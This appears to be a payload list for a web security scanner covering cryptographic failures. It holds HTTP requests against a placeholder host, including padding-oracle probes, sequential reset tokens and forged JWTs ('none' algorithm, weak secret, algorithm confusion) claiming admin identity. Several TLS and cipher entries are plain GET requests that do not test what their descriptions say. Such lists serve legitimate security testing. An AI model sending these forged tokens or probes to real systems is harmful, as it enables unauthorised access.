description: A04:2025 - Cryptographic Failures - Testing for weak encryption, insecure protocols, and crypto misconfigurations

payloads.payload:
GET / HTTP/1.1
Host: target.com
payloads.description: Test SSLv2 support (deprecated, insecure)

payloads.payload:
GET / HTTP/1.1
Host: target.com
payloads.description: Test SSLv3 support (POODLE vulnerability)

payloads.payload:
GET / HTTP/1.1
Host: target.com
payloads.description: Test TLS 1.0 support (deprecated)

payloads.payload:
GET / HTTP/1.1
Host: target.com
payloads.description: Test NULL cipher support

payloads.payload:
GET / HTTP/1.1
Host: target.com
payloads.description: Test EXPORT cipher support (weak 40/56-bit)

payloads.payload:
GET / HTTP/1.1
Host: target.com
payloads.description: Test DES cipher support (56-bit, insecure)

payloads.payload:
GET / HTTP/1.1
Host: target.com
payloads.description: Test 3DES cipher support (deprecated)

payloads.payload:
GET / HTTP/1.1
Host: target.com
payloads.description: Test RC4 cipher support (broken)

payloads.payload:
GET / HTTP/1.1
Host: target.com
payloads.description: Test MD5 cipher support (collision attacks)

payloads.payload:
GET / HTTP/1.1
Host: target.com
payloads.description: Test anonymous DH cipher (no authentication)

payloads.payload:
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

encrypted_data=AAAAAAAAAAAAAAAA
payloads.description: Padding oracle attack - test with invalid padding

payloads.payload:
POST /api/decrypt HTTP/1.1
Host: target.com
Content-Type: application/json

{"ciphertext":"0000000000000000"}
payloads.description: Padding oracle - observe timing differences

payloads.payload:
POST /encrypt HTTP/1.1
Host: target.com
Content-Type: application/json

{"data":"AAAAAAAAAAAAAAAA"}
payloads.description: ECB mode detection - identical blocks produce identical ciphertext

payloads.payload:
GET /api/token HTTP/1.1
Host: target.com
payloads.description: Test predictable random token generation

payloads.payload:
GET /reset-password?token=12345 HTTP/1.1
Host: target.com
payloads.description: Test sequential token values

payloads.payload:
POST /api/hash HTTP/1.1
Host: target.com
Content-Type: application/json

{"algorithm":"md5","data":"test"}
payloads.description: Test MD5 hash usage (collision vulnerable)

payloads.payload:
POST /api/hash HTTP/1.1
Host: target.com
Content-Type: application/json

{"algorithm":"sha1","data":"test"}
payloads.description: Test SHA1 hash usage (collision vulnerable)

payloads.payload:
GET /api/data HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.
payloads.description: JWT with 'none' algorithm

payloads.payload:
GET /api/data HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
payloads.description: JWT with weak secret (common passwords)

payloads.payload:
GET /api/data HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.HMACSHA256
payloads.description: JWT algorithm confusion (RS256 to HS256)
